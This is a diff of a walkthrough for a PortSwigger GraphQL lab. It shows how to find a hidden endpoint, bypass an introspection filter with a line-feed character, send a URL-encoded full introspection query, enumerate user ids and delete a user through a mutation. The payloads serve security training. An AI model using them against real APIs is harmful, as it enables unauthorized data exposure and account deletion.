@@ -1,12 +1,14 @@
-**Unfinished**
-
 The URL query parameter's value at the end of the file is meant to solve the following lab:
 https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint
 
-https://<IP_Address>.web-security-academy.net/api
+
+Looking for common GraphQL API end points you'll eventually come across the following response for the /api directory:
 "Query not present"
 
+Now that we've found the endpoint we can try guessing the parameter name, which leads us to:
 https://<IP_Address>.web-security-academy.net/api?query
+
+The message we get when sending a request to the above URL looks like this:
 
 {
   "errors": [
@@ -22,8 +24,10 @@ https://<IP_Address>.web-security-academy.net/api?query
   ]
 }
 
-
+If we try sending a request for introspection with the following URL:
 https://<IP_Address>.web-security-academy.net/api?query=query%7B__schema%7BqueryType%7Bname%7D%7D%7D
+
+We'll see the following error:
 
 {
   "errors": [
@@ -34,8 +38,10 @@ https://<IP_Address>.web-security-academy.net/api?query=query%7B__schema%7Bquery
   ]
 }
 
-
+Adding a line feed character between "__schema" and "queryType" by using the following URL:
 https://<IP_Address>.web-security-academy.net/api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+
+Will lead us to this response:
 
 {
   "data": {
@@ -47,6 +53,7 @@ https://<IP_Address>.web-security-academy.net/api?query=query%7B__schema%0A%7Bqu
   }
 }
 
+Now that we've figured out how to bypass the filter, we can use the following full introspection query:
 
 {
     __schema {
@@ -133,3 +140,43 @@ fragment TypeRef on __Type {
         }
     }
 }
+
+But since the above full introspection query needs to be passed in a get request parameters value, we'll need to URL encode all the spaces and line feed characters.
+As well as delete the 3 lines with the comments, which leads us to the following crafted URL:
+
+{__schema%0A{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name%0adescription%0Aargs{...InputValue}}}}%0A%0Afragment%20FullType%20on%20__Type{kind%0Aname%0Adescription%0Afields(includeDeprecated:%20true){name%0Adescription%0Aargs{...InputValue}type{...TypeRef}isDeprecated%0AdeprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:%20true){name%0Adescription%0AisDeprecated%0AdeprecationReason}possibleTypes{...TypeRef}}%0A%0Afragment%20InputValue%20on%20__InputValue{name%0Adescription%0Atype{...TypeRef}defaultValue}%0A%0Afragment%20TypeRef%20on%20__Type{kind%0Aname%0AofType{kind%0Aname%0AofType{kind%0Aname%0AofType{kind%0Aname}}}}
+
+Sending a request to GraphQL endpoint with the line above will result in a huge response of JSON data.
+After taking the JSON data and saving it in a file we can use the BurpSuite extension named InQL where we'll find the following query and mutation:
+
+query {
+	getUser(id:1334) {
+		id
+		username
+	}
+}
+
+mutation {
+	deleteOrganizationUser(input:{id: 1334}) {
+		user {
+			id
+		}
+	}
+}
+
+Now all that is left is to enumerate user id's until we find the user id for Carlos, which ends up being 3.
+
+{getUser(id%3A3){id%0Ausername}}
+
+{
+  "data": {
+    "getUser": {
+      "id": 3,
+      "username": "carlos"
+    }
+  }
+}
+
+Now that we have the id for carlos we can send a request to delete his profile by using the mutation we found.
+
+mutation{deleteOrganizationUser(input%3A{id%3A%203}){user{id}}}
